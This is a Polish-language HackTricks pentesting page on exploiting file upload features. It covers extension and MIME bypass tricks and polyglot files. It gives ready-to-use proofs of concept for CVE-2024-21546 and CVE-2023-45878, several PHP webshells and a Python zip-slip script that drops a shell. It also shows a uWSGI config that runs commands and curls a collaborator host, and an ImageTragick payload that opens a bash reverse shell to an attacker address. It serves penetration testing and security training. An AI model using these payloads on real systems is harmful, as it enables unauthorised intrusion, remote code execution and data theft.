# Przesyłanie plików

{{#include ../../banners/hacktricks-training.md}}

## Ogólna metodologia przesyłania plików

Inne przydatne rozszerzenia:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Praca w PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Omijanie kontroli rozszerzeń plików

1. Jeśli stosowane, **sprawdź** poprzednie rozszerzenia. Testuj też je używając **wielkich liter**: _pHp, .pHP5, .PhAr ..._
2. _Sprawdź **dodanie prawidłowego rozszerzenia przed** rozszerzeniem wykonawczym (użyj też poprzednich rozszerzeń):_
- _file.png.php_
- _file.png.Php5_
3. Spróbuj dodać **znaki specjalne na końcu.** Możesz użyć Burp do **bruteforce** wszystkich znaków **ascii** i **Unicode**. (_Uwaga: możesz też spróbować użyć **wcześniej** wspomnianych **rozszerzeń**_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Spróbuj ominąć zabezpieczenia **oszukując parser rozszerzeń** po stronie serwera technikami takimi jak **podwajanie** **rozszerzenia** lub **dodawanie śmieciowych** danych (bajtów **null**) między rozszerzeniami. _Możesz też użyć **wcześniejszych rozszerzeń** do przygotowania lepszego ładunku._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Dodaj **kolejną warstwę rozszerzeń** do poprzedniego sprawdzenia:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Spróbuj umieścić **rozszerzenie wykonawcze przed prawidłowym rozszerzeniem** i miej nadzieję, że serwer jest źle skonfigurowany. (przydatne do wykorzystania błędnych konfiguracji Apache, gdzie wszystko z rozszerzeniem .php (niekoniecznie kończące się na .php) wykona kod):
- _ex: file.php.png_
7. Użyj **NTFS alternate data stream (ADS)** w **Windows**. W tym przypadku po zabronionym rozszerzeniu i przed dozwolonym zostanie wstawiony dwukropek ":". W rezultacie na serwerze zostanie utworzony **pusty plik z zabronionym rozszerzeniem** (np. "file.asax:.jpg"). Ten plik może być później edytowany przy użyciu innych technik, takich jak użycie jego short filename. Wzorzec "**::$data**” może też być użyty do tworzenia niepustych plików. Dlatego dodanie kropki po tym wzorcu może być przydatne do obejścia dalszych ograniczeń (np. "file.asp::$data.")
8. Spróbuj przełamać limity nazwy pliku. Prawidłowe rozszerzenie zostaje obcięte. Pozostaje złośliwy PHP. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Niektóre upload handlery obcinają lub normalizują znaki kropki na końcu nazwy pliku zapisywanej na dysku. W UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) w wersjach przed 2.9.1 możesz obejść walidację rozszerzenia przez:

- Użycie prawidłowego MIME obrazu i magic header (np. PNG’s `\x89PNG\r\n\x1a\n`).
- Nazwanie przesyłanego pliku rozszerzeniem PHP z kropką na końcu, np. `shell.php.`.
- Serwer usuwa końcową kropkę i zapisuje `shell.php`, który zostanie wykonany, jeśli zostanie umieszczony w katalogu obsługiwanym przez web (domyczne public storage jak `/storage/files/`).

Minimalny PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Następnie odwiedź zapisany path (typowe w Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
Mitigations:
- Zaktualizuj unisharp/laravel-filemanager do ≥ 2.9.1.
- Wymuś ścisłe server-side allowlists i ponownie waliduj zapisany filename.
- Serwuj uploads z lokalizacji non-executable.

### Bypass Content-Type, Magic Number, Compression & Resizing

- Bypass **Content-Type** checks przez ustawienie **value** nagłówka **Content-Type** na: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Bypass **magic number** check przez dodanie na początku pliku **bytes of a real image** (w celu zmylenia polecenia _file_). Lub wprowadź shell wewnątrz **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` albo możesz też **wprowadzić payload bezpośrednio** do obrazu:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Jeśli do twojego obrazu jest dodawana **kompresja**, na przykład używając standardowych bibliotek PHP takich jak [PHP-GD](https://www.php.net/manual/fr/book.image.php), powyższe techniki mogą być bezużyteczne. Jednak możesz użyć **PLTE chunk** [**techniki zdefiniowanej tutaj**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) aby wstawić tekst, który **przetrwa kompresję**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Strona web może także **resizing** **image**, używając na przykład funkcji PHP-GD `imagecopyresized` lub `imagecopyresampled`. Jednak możesz użyć **IDAT chunk** [**techniki zdefiniowanej tutaj**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) aby wstawić tekst, który **przetrwa kompresję**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Inna technika na stworzenie payloadu, który **przetrwa zmianę rozmiaru obrazu**, używając funkcji PHP-GD `thumbnailImage`. Możesz też użyć **tEXt chunk** [**techniki zdefiniowanej tutaj**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) aby wstawić tekst, który **przetrwa kompresję**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- Znajdź podatność pozwalającą **rename** pliku już przesłanego (aby zmienić extension).
- Znajdź **Local File Inclusion** podatność aby uruchomić backdoor.
- **Możliwe ujawnienie informacji**:
1. Upload **kilka razy** (i w tym **samym czasie**) tego **samego pliku** o **tej samej nazwie**
2. Załaduj plik o **nazwie** pliku lub folderu, który **już istnieje**
3. Wgrywanie pliku o nazwie **"." , "..", or "…"**. Na przykład, w Apache na **Windows**, jeśli aplikacja zapisuje uploady w katalogu "/www/uploads/", nazwa pliku "." stworzy plik o nazwie
uploads” w katalogu "/www/".
4. Wgraj plik, który może być trudno usunąć, taki jak **"…:.jpg"** w **NTFS**. (Windows)
5. Wgraj plik w **Windows** z **invalid characters** takimi jak `|<>*?”` w jego nazwie. (Windows)
6. Wgraj plik w **Windows** używając **reserved** (**forbidden**) **names** takich jak CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, i LPT9.
- Spróbuj również **upload an executable** (.exe) lub **.html** (mniej podejrzane), który **wykona kod** gdy zostanie przypadkowo otwarty przez ofiarę.

### Special extension tricks

Jeżeli próbujesz uploadować pliki na **PHP server**, [zobacz sztuczkę z **.htaccess** aby wykonać kod](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Jeżeli próbujesz uploadować pliki na **ASP server**, [zobacz sztuczkę z **.config** aby wykonać kod](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Pliki `.phar` są jak `.jar` dla java, ale dla php, i mogą być **używane jak plik php** (wykonywane z php, lub includowane w skrypcie...)

Rozszerzenie `.inc` jest czasami używane dla php files, które są jedynie używane do **import plików**, więc, w pewnym momencie, ktoś mógł pozwolić na **wykonywanie tego extension**.

## **Jetty RCE**

Jeśli możesz uploadować plik XML na Jetty server, możesz uzyskać [RCE ponieważ **nowe *.xml and *.war są automatycznie przetwarzane**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Jak wspomniano na poniższym obrazku, wyślij plik XML do `$JETTY_BASE/webapps/` i oczekuj shell'a!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Dla szczegółowego omówienia tej podatności sprawdź oryginalne badanie: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) podatności mogą być exploitowane na uWSGI servers jeśli atakujący ma możliwość modyfikacji pliku konfiguracyjnego `.ini`. Pliki konfiguracyjne uWSGI wykorzystują specyficzną składnię do włączania "magic" zmiennych, placeholderów i operatorów. W szczególności operator '@', używany jako `@(filename)`, jest zaprojektowany do includowania zawartości pliku. Wśród różnych wspieranych schem w uWSGI, schemat "exec" jest szczególnie potężny, pozwalając na czytanie danych z stdout procesu. Ta funkcja może być zmanipulowana dla złośliwych celów takich jak Remote Command Execution lub Arbitrary File Write/Read gdy plik konfiguracyjny `.ini` jest przetwarzany.

Rozważ poniższy przykład szkodliwego pliku `uwsgi.ini`, ukazujący różne schematy:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Wykonanie payload następuje podczas parsowania pliku konfiguracyjnego. Aby konfiguracja została aktywowana i sparsowana, proces uWSGI musi zostać albo zrestartowany (potencjalnie po crashu lub w wyniku Denial of Service attack) albo plik musi być ustawiony na auto-reload. Funkcja auto-reload, jeśli jest włączona, przeładowuje plik w określonych odstępach czasu po wykryciu zmian.

Konieczne jest zrozumienie luźnego sposobu parsowania plików konfiguracyjnych przez uWSGI. Konkretnie, omawiany payload można wstawić do pliku binarnego (np. obrazu lub PDF), co dodatkowo rozszerza zakres potencjalnego wykorzystania.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Nieautoryzowany endpoint w Gibbon LMS pozwala na arbitrary file write wewnątrz web root, prowadząc do pre-auth RCE przez upuszczenie pliku PHP. Wrażliwe wersje: do i włącznie 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Required params:
- `img`: data-URI-like string: `[mime];[name],[base64]` (serwer ignoruje typ/nazwę, dekoduje zakodowaną w base64 część)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: any non-empty value is accepted (e.g., `0000000001`)

Minimalny PoC do zapisania i ponownego odczytania pliku:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Wgraj minimalny webshell i wykonaj polecenia:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Notatki:
- Handler wykonuje `base64_decode($_POST["img"])` po podzieleniu po `;` i `,`, a następnie zapisuje bajty do `$absolutePath . '/' . $_POST['path']` bez walidacji rozszerzenia/typu.
- W rezultacie kod uruchamia się jako użytkownik serwera WWW (np. XAMPP Apache on Windows).

Odnośniki do tego buga obejmują advisory usd HeroLab oraz wpis w NVD. Zobacz sekcję References poniżej.

## **wget File Upload/SSRF Trick**

W niektórych przypadkach możesz natrafić na serwer, który używa **`wget`** do **pobierania plików** i możesz **wskazać** **URL**. W takich przypadkach kod może sprawdzać, czy rozszerzenie pobieranego pliku znajduje się na whitelist, aby upewnić się, że będą pobierane tylko dozwolone pliki. Jednakże, **tę kontrolę można obejść.**\

The **maksymalna** length of a **filename** in **linux** is **255**, however, **wget** truncate the filenames to **236** characters. You can **pobrać plik o nazwie "A"*232+".php"+".gif"**, ta nazwa pliku **obejdzie** the **check** (jak w tym przykładzie **".gif"** jest **valid** rozszerzeniem) ale `wget` **zmieni nazwę** pliku na **"A"*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Zwróć uwagę, że **inną opcją**, o której możesz myśleć, aby obejść tę kontrolę, jest sprawienie, żeby HTTP server przekierował do innego pliku, więc początkowy URL ominie sprawdzenie, a następnie wget pobierze przekierowany plik pod nową nazwą. To **nie zadziała** **chyba że** wget jest użyty z **parametrem** `--trust-server-names`, ponieważ **wget pobierze przekierowaną stronę pod nazwą pliku wskazaną w oryginalnym URL**.

## Narzędzia

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) to potężne narzędzie zaprojektowane, aby wspierać Pentesters i Bug Hunters w testowaniu mechanizmów przesyłania plików. Wykorzystuje różne techniki bug bounty, aby uprościć proces identyfikacji i eksploatacji podatności, zapewniając dokładne oceny aplikacji webowych.

### Corrupting upload indices with snprintf quirks (historical)

Niektóre przestarzałe handlery przesyłania plików, które używają `snprintf()` lub podobnych do budowania tablic multi-file z pojedynczego uploadu pliku, mogą zostać oszukane do sfałszowania struktury `_FILES`. Z powodu niekonsekwencji i obcinania w zachowaniu `snprintf()`, starannie spreparowany pojedynczy upload może wyglądać po stronie serwera jak wiele plików z indeksami, wprowadzając w błąd logikę zakładającą sztywną strukturę (np. traktując ją jako upload wielu plików i wybierając niebezpieczne gałęzie). Choć dziś niszowy, wzorzec “index corruption” czasem pojawia się ponownie w CTFs i starszych bazach kodu.

## From File upload to other vulnerabilities

- Ustaw **filename** na `../../../tmp/lol.png` i spróbuj osiągnąć **path traversal**
- Ustaw **filename** na `sleep(10)-- -.jpg` i możesz być w stanie osiągnąć **SQL injection**
- Ustaw **filename** na `<svg onload=alert(document.domain)>` aby wywołać **XSS**
- Ustaw **filename** na `; sleep 10;` aby przetestować pewne command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Jeśli możesz wskazać web server, aby pobrał obraz z URL, możesz spróbować nadużyć [SSRF](../ssrf-server-side-request-forgery/index.html). Jeśli ten **image** zostanie **saved** w jakimś **public** serwisie, możesz też wskazać URL z [https://iplogger.org/invisible/](https://iplogger.org/invisible/) i **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specjalnie spreparowane PDFy do XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). Jeśli możesz uploadować PDFy, możesz przygotować jakiś PDF, który wykona arbitralny JS zgodnie z podanymi wskazówkami.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **antivirus**
- Sprawdź, czy istnieje jakieś **size limit** przy wysyłaniu plików

Here’s a top 10 list of things that you can achieve by uploading (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Zobacz [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) dla innych typów plików.

## Zip/Tar File Automatically decompressed Upload

Jeśli możesz przesłać ZIP, który zostanie zdekompresowany na serwerze, możesz zrobić dwie rzeczy:

### Symlink

Prześlij archiwum zawierające linki symboliczne do innych plików, wtedy po dostępie do zdekompresowanych plików uzyskasz dostęp do plików wskazywanych przez te linki:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Dekompresja do różnych folderów

Nieoczekiwane tworzenie plików w katalogach podczas dekompresji jest poważnym problemem. Mimo początkowych założeń, że taka konfiguracja może chronić przed OS-level command execution poprzez złośliwe przesyłanie plików, wsparcie dla hierarchicznej kompresji i directory traversal capabilities of the ZIP archive format mogą zostać wykorzystane. To pozwala atakującym obejść ograniczenia i wydostać się z secure upload directories, manipulując funkcjonalnością dekompresji atakowanej aplikacji.

Zautomatyzowany exploit do tworzenia takich plików jest dostępny na [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Narzędzie można użyć w następujący sposób:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Ponadto opcją jest **symlink trick with evilarc**. Jeśli celem jest zaatakowanie pliku takiego jak `/flag.txt`, należy utworzyć w systemie symlink do tego pliku. Zapewni to, że evilarc nie napotka błędów podczas działania.

Poniżej znajduje się przykład kodu Python używanego do utworzenia złośliwego pliku zip:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Wykorzystywanie kompresji do file spraying**

For further details **check the original post in**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Tworzenie PHP Shell**: Kod PHP zostaje napisany tak, aby wykonywał polecenia przekazane przez zmienną `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying i tworzenie skompresowanego pliku**: Tworzonych jest wiele plików, a następnie składany jest archiwum zip zawierające te pliki.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modyfikacja przy użyciu edytora heksadecymalnego lub vi**: Nazwy plików wewnątrz zip są zmieniane przy użyciu vi lub edytora heksadecymalnego, zamieniając "xxA" na "../" w celu przejścia do katalogów nadrzędnych.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

## ImageTragic

Prześlij tę zawartość z rozszerzeniem obrazu, aby wykorzystać podatność **(ImageMagick , 7.0.1-1)** (od [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Osadzanie PHP Shell w PNG

Osadzenie PHP shell w chunku IDAT pliku PNG może skutecznie obejść niektóre operacje przetwarzania obrazów. Funkcje `imagecopyresized` i `imagecopyresampled` z PHP-GD są szczególnie istotne w tym kontekście, ponieważ są powszechnie używane odpowiednio do zmiany rozmiaru i resamplingu obrazów. Możliwość, że osadzony PHP shell pozostanie nienaruszony przez te operacje, stanowi znaczącą zaletę w określonych przypadkach użycia.

Szczegółowe omówienie tej techniki, łącznie z metodologią i potencjalnymi zastosowaniami, znajduje się w następującym artykule: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Ten zasób oferuje kompleksowe zrozumienie procesu i jego implikacji.

Więcej informacji: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Pliki polyglot

Pliki polyglot działają jak kameleony w cybersecurity, mogąc poprawnie istnieć w wielu formatach plików jednocześnie. Interesującym przykładem jest [GIFAR](https://en.wikipedia.org/wiki/Gifar), hybryda funkcjonująca zarówno jako GIF, jak i archiwum RAR. Takie pliki nie ograniczają się do tej pary; możliwe są też kombinacje typu GIF i JS czy PPT i JS.

Główna użyteczność plików polyglot polega na ich zdolności do obejścia zabezpieczeń, które filtrują pliki na podstawie typu. Powszechną praktyką w wielu aplikacjach jest zezwalanie tylko na określone typy plików przy uploadzie — np. JPEG, GIF czy DOC — aby zredukować ryzyko wynikające z potencjalnie niebezpiecznych formatów (np. JS, PHP czy Phar). Jednak polyglot, spełniając strukturalne kryteria wielu formatów, może dyskretnie obejść te ograniczenia.

Mimo swojej elastyczności, polygloty napotykają ograniczenia. Na przykład, choć polyglot może jednocześnie zawierać plik PHAR (PHp ARchive) i JPEG, powodzenie jego uploadu może zależeć od polityki dotyczącej rozszerzeń plików na danej platformie. Jeśli system jest rygorystyczny co do dozwolonych rozszerzeń, sama strukturalna dwoistość polyglota może nie wystarczyć do zatwierdzenia uploadu.

Więcej informacji: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

Jak uniknąć wykrywania typu pliku przez upload poprawnego pliku JSON nawet jeśli nie jest dozwolony, podszywając go pod plik PDF (techniki z **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Dopóki bajty magiczne `%PDF` znajdują się w pierwszych 1024 bajtach, jest to uznawane za ważne (zobacz przykład w poście)
- **`pdflib` library**: Dodaj fałszywy format PDF wewnątrz pola JSON, aby biblioteka uznała go za pdf (zobacz przykład w poście)
- **`file` binary**: Potrafi odczytać do 1048576 bajtów z pliku. Po prostu stwórz JSON większy niż ta wartość, aby nie mógł sparsować zawartości jako JSON, a następnie wewnątrz JSON umieść początkową część prawdziwego PDF — wówczas zostanie uznany za PDF

## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
